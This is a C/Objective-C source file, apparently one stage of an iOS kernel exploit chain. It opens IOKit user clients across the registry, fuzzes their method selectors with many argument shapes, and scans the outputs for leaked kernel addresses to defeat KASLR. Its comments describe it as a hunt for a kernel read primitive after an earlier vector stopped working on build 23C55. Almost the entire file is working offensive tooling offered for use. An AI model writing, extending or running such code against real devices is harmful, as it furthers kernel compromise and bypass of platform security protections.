/* KERNEL LEAK HUNT — find a user client that hands back a kernel address.
 *
 * WHY THIS EXISTS
 *   Everything downstream needs one thing first: a way to READ the kernel.
 *   The NECP data-only vector is dead on 23C55 (phase 1 of discover_read
 *   returns zero reflected offsets), so the read channel has to come from
 *   somewhere else. The cheapest possible read channel is a user client
 *   method that returns a kernel virtual address in its output: that value
 *   is a KASLR anchor, and the object it points at is often a struct whose
 *   contents can then be steered.
 *
 * WHAT IT DOES
 *   1. IOGPU/AGX: the exact per-selector arity is known (oob_ar_tables.h),
 *      so every method of every table is called with the shape it really
 *      wants and the whole output is scanned.
 *   2. Every other reachable user client: the shape is unknown, so a small
 *      matrix of (scalar count, struct size) is probed per selector; a
 *      selector that answers something other than bad-argument is retried
 *      with every shape and its output is scanned.
 *   3. The IOGPU group path (cmd 3 / 64 / 130) is called with the known
 *      good arguments and the ENTIRE output is dumped, because that is the
 *      path we know answers, and a group handle may be the one that leaks.
 *
 * THE DETECTOR
 *   On iOS the kernel sits in the top 36 bits: text ~0xfffffff00a.... and
 *   the kalloc heap ~0xfffffff2....  Any 8-byte output value with
 *   (v >> 32) in 0xfffffff0..0xfffffff3 is a kernel VA.
 *
 * OUTPUT: Documents/kern_leak.log (durable, fsync per hit) + the UI log.
 */
#import <IOKit/IOKitLib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include "exploit.h"
#include "nk_trace.h"
#include "oob_ar_tables.h"

#define klf(fmt, ...) do { nk_log(fmt, ##__VA_ARGS__); \
                           nk_doc_log("kern_leak.log", fmt, ##__VA_ARGS__); } while (0)

#define KL_MAX_CONN  64
#define KL_MAX_SEL   256
#define KL_MAX_SZ    0x400
#define KL_MAX_SVC   40

static const char *k_kl_svcs[KL_MAX_SVC] = {
    "IOGPU", "IOGPUDevice", "IOGPUDeviceUserClient", "AGXAcceleratorG14P",
    "AGXAcceleratorG15P", "AppleDCP", "IOAccelDevice", "IOAccelShared",
    "IOSurfaceRoot", "AppleAVE2", "AppleAVD", "IOMobileFrameBuffer",
    "AppleSEP", "IOHIDEventSystemClient", "IOHIDKeyboard", "IOHIDDevice",
    "IOPlatformExpertDevice", "AppleDiskImages", "AppleARMPE",
    "IOUSBHostDevice", "AppleUSBHostController", "AppleBCMWLAN", "AppleSMC",
    "AppleGPE", "IOKitHibernate", "AppleUserIdentity", "AppleMobileFileIntegrity",
    "ANS", "AppleANS", "IOHIDSystem", "AppleHIDKeyboard", "AppleAuthMedia",
    "IONVMeFamily", "AppleCredentialManager", "IOMobileDevice", "AppleH13Camera",
    "AppleSEPManager", "AppleGMLB", "AppleAOP", "IOMobileFramebuffer"
};

static const uint32_t k_kl_types[] = { 0, 1, 2, 3, 4, 5, 6, 33, 7, 8 };

typedef struct {
    const char  *svc;
    uint32_t     type;
    io_connect_t conn;
} kl_conn_t;

/* A service name discovered in the IORegistry has to outlive the sweep,
 * so it is copied into a static pool. */
#define KL_NAME_POOL 4096
static char g_kl_names[KL_NAME_POOL];
static uint32_t g_kl_names_used;
static const char *kl_name_intern(const char *s)
{
    size_t n = strlen(s) + 1;
    if (g_kl_names_used + n > KL_NAME_POOL) return "<?>";
    char *p = g_kl_names + g_kl_names_used;
    memcpy(p, s, n);
    g_kl_names_used += (uint32_t)n;
    return p;
}

static kl_conn_t g_kl_conns[KL_MAX_CONN];
static uint32_t  g_kl_nconns;
static uint32_t  g_kl_hits;
static uint32_t  g_kl_calls;

#define KL_KERNEL_LO 0xfffffff000000000ULL
#define KL_KERNEL_HI 0xffffffff00000000ULL

static int kl_is_kernel_va(uint64_t v)
{
    if (v < KL_KERNEL_LO || v >= KL_KERNEL_HI) return 0;
    if ((v & 0xffffffff0000ffffULL) == 0x2bad000000000000ULL) return 0;
    if (v == 0xffffffffffffffffULL) return 0;
    if (v == 0xdeadbeefdeadbeefULL) return 0;
    if (v == 0x00000000deadbeefULL) return 0;
    return 1;
}

static void kl_report(const char *svc, uint32_t type, uint32_t sel, const char *tag,
                       const char *shape, size_t off, uint64_t v, const uint8_t *raw, size_t n)
{
    g_kl_hits++;
    klf("[KL] %s type=%u sel=%u %s shape=%s out_off=0x%zx VALUE=0x%016llx",
        svc, type, sel, tag, shape, off, (unsigned long long)v);
    /* dump a window around the hit so the layout can be reconstructed */
    size_t base = (off >= 0x20) ? (off - 0x20) : 0;
    size_t end = (off + 0x28 <= n) ? (off + 0x28) : n;
    for (size_t o = base; o + 8 <= end; o += 8) {
        uint64_t w = 0;
        memcpy(&w, raw + o, 8);
        klf("[KL]   +0x%03zx = 0x%016llx%s", o, (unsigned long long)w,
            (w == v) ? "   <-- kernel VA" : "");
    }
}

static void kl_scan(const char *svc, uint32_t type, uint32_t sel, const char *tag,
                     const char *shape, const uint8_t *buf, size_t n)
{
    for (size_t off = 0; off + 8 <= n; off += 8) {
        uint64_t v = 0;
        memcpy(&v, buf + off, 8);
        if (kl_is_kernel_va(v)) kl_report(svc, type, sel, tag, shape, off, v, buf, n);
    }
}

static int kl_kr_boring(kern_return_t kr)
{
    return kr == KERN_SUCCESS || kr == (kern_return_t)0xe00002c2 ||
           kr == (kern_return_t)0xe00002c7 || kr == (kern_return_t)0xe00002c1 ||
           kr == (kern_return_t)0xe00002c0 || kr == (kern_return_t)0xe00002e3 ||
           kr == (kern_return_t)0xe00002c3;
}

typedef struct { uint32_t nscal, ssz; } kl_shape_t;

static const kl_shape_t k_kl_shapes[] = {
    { 0, 0x40 }, { 1, 0 }, { 0, 0x80 }, { 1, 0x40 },
    { 2, 0 }, { 0, 0x100 }, { 1, 0x80 }, { 2, 0x40 },
    { 3, 0 }, { 4, 0 }, { 0, 0x20 }, { 1, 0x20 },
    { 0, 0x200 }, { 0, 0x400 }, { 1, 0x100 }, { 2, 0x80 },
    { 4, 0x40 }, { 3, 0x40 }, { 2, 0x100 }, { 1, 0x200 }
};
#define KL_NSHAPES (sizeof(k_kl_shapes)/sizeof(k_kl_shapes[0]))


/* THE REGISTRY SWEEP.
 *
 * Matching by service name found almost nothing: on this build
 * AppleAVE2, AppleAVD, AppleSEP, IOHIDEventSystemClient and friends are
 * not reachable under those names, so the only clients that opened were
 * IOGPU, AGXAcceleratorG14P, IOSurfaceRoot and IOMobileFramebuffer. The
 * registry itself knows every service, so walk it and try to open a user
 * client on each one - that is the only way to reach the media engine,
 * the HID system, the SEP and the rest. */
static void kl_registry_sweep(void)
{
    /* IOServiceMatching(NULL) matches EVERY service in the IORegistry and
     * IOServiceGetMatchingServices materialises the whole list - on this
     * build that froze the phone (tens of thousands of IOKit calls, then
     * the watchdog killed the app). The iterator API walks the same tree
     * lazily, so the cost is bounded by how many entries we actually look
     * at. Hard caps on top of that. */
    io_iterator_t iter = 0;
    kern_return_t kr = IORegistryCreateIterator(kIOMasterPortDefault,
                                                 kIOServicePlane,
                                                 kIORegistryIterateRecursively |
                                                 kIORegistryIterateParents,
                                                 &iter);
    if (kr != KERN_SUCCESS || !iter) {
        klf("[KL] registry iterator failed (kr=0x%x)", kr);
        return;
    }
    static const uint32_t reg_types[] = { 0, 1, 2, 33 };
    io_registry_entry_t ent;
    uint32_t seen = 0, opened = 0, since_yield = 0;
    while ((ent = (io_registry_entry_t)IOIteratorNext(iter)) != 0) {
        seen++;
        if (seen > 400) { IOObjectRelease(ent); break; }
        char nm[128] = {0};
        io_name_t onm = {0};
        if (IORegistryEntryGetName(ent, onm) == KERN_SUCCESS) {
            strncpy(nm, (const char *)onm, sizeof(nm) - 1);
        }
        for (size_t t = 0; t < sizeof(reg_types)/sizeof(reg_types[0]); t++) {
            io_connect_t c = MACH_PORT_NULL;
            if (IOServiceOpen(ent, mach_task_self(), reg_types[t], &c) == KERN_SUCCESS && c) {
                if (g_kl_nconns < KL_MAX_CONN) {
                    g_kl_conns[g_kl_nconns].svc = kl_name_intern(nm[0] ? nm : "?");
                    g_kl_conns[g_kl_nconns].type = reg_types[t];
                    g_kl_conns[g_kl_nconns].conn = c;
                    klf("[KL] REG OPEN %s type=%u conn[%u]",
                        g_kl_conns[g_kl_nconns].svc, reg_types[t], g_kl_nconns);
                    g_kl_nconns++;
                    opened++;
                } else {
                    IOServiceClose(c);
                }
                since_yield++;
            }
        }
        if (since_yield >= 40) {
            since_yield = 0;
            usleep(3000);           /* give the watchdog a slice */
        }
        IOObjectRelease(ent);
    }
    IOObjectRelease(iter);
    klf("[KL] registry walk: services=%u opened=%u", seen, opened);
}

static void kl_call(kl_conn_t *cn, uint32_t sel, const kl_shape_t *sh,
                    const char *shape_tag)
{
    static uint8_t sin[KL_MAX_SZ];
    static uint8_t sout[KL_MAX_SZ];
    uint64_t in_scal[4] = { 1, 1, 1, 1 };
    uint64_t out_scal[4] = { 0, 0, 0, 0 };

    memset(sin, 0, sizeof(sin));
    for (uint32_t w = 0; w + 8 <= sh->ssz; w += 8) {
        uint64_t v = 0x1111111111111111ULL;
        memcpy(sin + w, &v, 8);
    }
    /* a plausible pointer for the pointer-shaped slots: our own stack buffer
     * is a real mapped address, so a getter that copies *ptr works */
    uintptr_t self = (uintptr_t)sin;
    if (sh->ssz >= 32) memcpy(sin + 24, &self, 8);

    size_t outN = sizeof(sout);
    memset(sout, 0, sizeof(sout));
    kern_return_t kr = IOConnectCallMethod(
        cn->conn, sel,
        sh->nscal ? in_scal : NULL, sh->nscal,
        sh->ssz ? sin : NULL, sh->ssz,
        out_scal, (void *)(uintptr_t)4,
        sout, &outN);
    g_kl_calls++;
    if (kr == KERN_SUCCESS) {
        kl_scan(cn->svc, cn->type, sel, "struct", shape_tag, sout, outN);
        kl_scan(cn->svc, cn->type, sel, "scalar", shape_tag, (const uint8_t *)out_scal, 32);
    } else if (!kl_kr_boring(kr)) {
        /* an answer other than bad-argument: this selector is live */
        klf("[KL] LIVE %s type=%u sel=%u shape=%s kr=0x%x", cn->svc, cn->type, sel, shape_tag, kr);
    }
}

/* The IOGPU group path: the one we know answers. Dump everything it says. */
static void kl_iogpu_group(void)
{
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                    IOServiceMatching("IOGPU"));
    if (!svc) { klf("[KL] no IOGPU service"); return; }
    io_connect_t conn = MACH_PORT_NULL;
    for (uint32_t t = 0; t <= 40 && !conn; t++) {
        io_connect_t c = MACH_PORT_NULL;
        if (IOServiceOpen(svc, mach_task_self(), t, &c) == KERN_SUCCESS && c) conn = c;
    }
    if (!conn) { klf("[KL] no usable IOGPU type"); return; }

    static uint8_t in[0x100];
    static uint8_t out[0x400];
    uint8_t args[64];
    memset(args, 0, sizeof(args));
    uintptr_t ap = (uintptr_t)args;

    struct { uint32_t cmd; uint64_t f56, f60, f64, f72, f80; const char *name; } cases[] = {
        {   3, 64, 0, 0, 0, 1, "cmd3 new_group type=64" },
        {   3, 128, 0, 0, 0, 1, "cmd3 new_group type=128" },
        {  64, 64, 0, 0, 0, 1, "cmd64 dim path" },
        { 130, 64, 0, 0, 0, 1, "cmd130 add_resource" },
    };

    uint64_t grp = 0;
    for (size_t i = 0; i < sizeof(cases)/sizeof(cases[0]); i++) {
        memset(in, 0, sizeof(in));
        uint64_t c = cases[i].cmd;
        memcpy(in + 0, &c, 8);
        memcpy(in + 56, &cases[i].f56, 8);
        memcpy(in + 60, &cases[i].f60, 8);
        memcpy(in + 64, &cases[i].f64, 8);
        memcpy(in + 72, &cases[i].f72, 8);
        memcpy(in + 80, &cases[i].f80, 8);
        memcpy(in + 24, &ap, 8);
        size_t on = sizeof(out);
        memset(out, 0, on);
        kern_return_t kr = IOConnectCallStructMethod(conn, 8, in, sizeof(in), out, &on);
        g_kl_calls++;
        klf("[KL] group case '%s' -> kr=0x%x outN=%zu", cases[i].name, kr, on);
        for (size_t o = 0; o + 8 <= (on ? on : 0x40); o += 8) {
            uint64_t v = 0;
            memcpy(&v, out + o, 8);
            klf("[KL]   group out+0x%03zx = 0x%016llx", o, (unsigned long long)v);
        }
        kl_scan("IOGPU-group", 0, cases[i].cmd, "group", cases[i].name, out, on ? on : 0x40);
        if (cases[i].cmd == 3 && kr == 0) { memcpy(&grp, out + 0x10, 8); }
    }
    klf("[KL] group handle = 0x%016llx", (unsigned long long)grp);

    /* Feed the group handle back to every command: some of them answer with
     * the group's internals (the element array, the bitmap, the mask), and
     * those are kernel addresses. */
    if (grp) {
        for (uint32_t cmd = 0; cmd < 256; cmd++) {
            memset(in, 0, sizeof(in));
            uint64_t c = cmd;
            memcpy(in + 0, &c, 8);
            memcpy(in + 56, &grp, 8);
            memcpy(in + 24, &ap, 8);
            size_t on = sizeof(out);
            memset(out, 0, on);
            kern_return_t kr = IOConnectCallStructMethod(conn, 8, in, sizeof(in), out, &on);
            g_kl_calls++;
            if (kr == 0) {
                char tag[32];
                snprintf(tag, sizeof(tag), "grp_cmd%u", cmd);
                kl_scan("IOGPU-group", 0, cmd, "groupcmd", tag, out, on ? on : 0x40);
            }
        }
        klf("[KL] group handle command sweep done (calls=%u hits=%u)", g_kl_calls, g_kl_hits);
    }
    IOServiceClose(conn);
}

void nk_kernel_leak_hunt(void)
{
    nk_doc_log_open("kern_leak.log");
    klf("[KL] === kernel leak hunt (23C55) ===");

    /* 1. the IOGPU group path, output dumped in full */
    kl_iogpu_group();

    /* 2. open every reachable user client */
    for (int s = 0; s < KL_MAX_SVC; s++) {
        CFMutableDictionaryRef m = IOServiceMatching(k_kl_svcs[s]);
        if (!m) continue;
        io_iterator_t it = 0;
        if (IOServiceGetMatchingServices(kIOMasterPortDefault, m, &it) != KERN_SUCCESS) continue;
        io_service_t svc;
        int opened_here = 0;
        while ((svc = IOIteratorNext(it))) {
            for (size_t t = 0; t < sizeof(k_kl_types)/sizeof(k_kl_types[0]); t++) {
                io_connect_t c = MACH_PORT_NULL;
                if (IOServiceOpen(svc, mach_task_self(), k_kl_types[t], &c) == KERN_SUCCESS && c) {
                    if (g_kl_nconns < KL_MAX_CONN) {
                        g_kl_conns[g_kl_nconns].svc = k_kl_svcs[s];
                        g_kl_conns[g_kl_nconns].type = k_kl_types[t];
                        g_kl_conns[g_kl_nconns].conn = c;
                        klf("[KL] OPEN %s type=%u conn[%u]", k_kl_svcs[s], k_kl_types[t], g_kl_nconns);
                        g_kl_nconns++;
                        opened_here = 1;
                    } else {
                        IOServiceClose(c);
                    }
                }
            }
        }
        if (!opened_here) klf("[KL] no user client for %s", k_kl_svcs[s]);
    }
    klf("[KL] named phase conns=%u", g_kl_nconns);

    /* the named phase only reached a handful of services - walk the whole
     * registry and open a user client on everything */
    kl_registry_sweep();
    klf("[KL] conns=%u", g_kl_nconns);

    /* 3. sweep: for every conn, every selector, every shape */
    for (uint32_t ci = 0; ci < g_kl_nconns; ci++) {
        kl_conn_t *cn = &g_kl_conns[ci];
        /* the IOGPU/AGX tables have a known arity - use it */
        const method_arity_t (*tabs)[128] = NULL;
        uint32_t ntabs = 0;
        if (cn->svc && strcmp(cn->svc, "IOGPU") == 0) { tabs = g_io_gpu_ar; ntabs = 4; }
        else if (cn->svc && strcmp(cn->svc, "IOGPUDevice") == 0) { tabs = g_io_gpu_ar; ntabs = 4; }
        else if (cn->svc && strcmp(cn->svc, "IOGPUDeviceUserClient") == 0) { tabs = g_io_gpu_ar; ntabs = 4; }
        else if (cn->svc && strcmp(cn->svc, "AGXAcceleratorG14P") == 0) { tabs = g_io_gpu_ar; ntabs = 4; }

        if (tabs) {
            for (uint32_t t = 0; t < ntabs; t++) {
                for (uint32_t sel = 0; sel < 128; sel++) {
                    const method_arity_t *a = &tabs[t][sel];
                    kl_shape_t sh;
                    sh.nscal = a->scalar_in > 4 ? 4 : a->scalar_in;
                    if (a->struct_in == 0) sh.ssz = 0;
                    else if (a->struct_in == 0xff) sh.ssz = 0x40;
                    else sh.ssz = a->struct_in > KL_MAX_SZ ? KL_MAX_SZ : a->struct_in;
                    char tag[32];
                    snprintf(tag, sizeof(tag), "tab%u", t);
                    kl_call(cn, sel, &sh, tag);
                }
            }
            klf("[KL] conn[%u] %s type=%u arity sweep done (calls=%u hits=%u)",
                ci, cn->svc, cn->type, g_kl_calls, g_kl_hits);
            continue;
        }

        /* unknown arity: probe the shape matrix. Bounded: the first four
         * shapes only, and a yield every 40 calls so the watchdog does not
         * kill the app. */
        for (uint32_t sel = 0; sel < KL_MAX_SEL; sel++) {
            for (size_t si = 0; si < 4 && si < KL_NSHAPES; si++) {
                char tag[32];
                snprintf(tag, sizeof(tag), "shape%u", (unsigned)si);
                kl_call(cn, sel, &k_kl_shapes[si], tag);
                if ((g_kl_calls % 40) == 0) usleep(2000);
            }
        }
        klf("[KL] conn[%u] %s type=%u shape sweep done (calls=%u hits=%u)",
            ci, cn->svc, cn->type, g_kl_calls, g_kl_hits);
    }

    klf("[KL] === done: calls=%u hits=%u ===", g_kl_calls, g_kl_hits);
    if (!g_kl_hits) klf("[KL] no kernel VA in any output");
}
